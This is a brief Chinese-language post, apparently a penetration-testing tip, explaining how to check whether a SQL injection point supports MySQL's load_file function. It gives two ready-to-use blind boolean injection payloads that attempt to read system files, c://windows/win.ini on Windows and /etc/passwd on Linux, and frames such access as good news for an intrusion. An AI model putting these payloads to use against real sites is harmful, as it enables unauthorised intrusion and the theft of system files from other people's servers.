在sql注入点中,如果一个注入点支持load_file函数来读取文件的话,无疑对我们进行渗透来说是一个好消息  

分享一下一条语句检测是否支持load_file读取文件  


Windows 注入点判断文件是否存在  

```
1 and 1=if(ascii(mid(load_file('c://windows/win.ini'),1,1))>0,1,2)
```

Linux  

```
1 and 1=if(ascii(mid(load_file('/etc/passwd'),1,1))>0,1,2) 
```
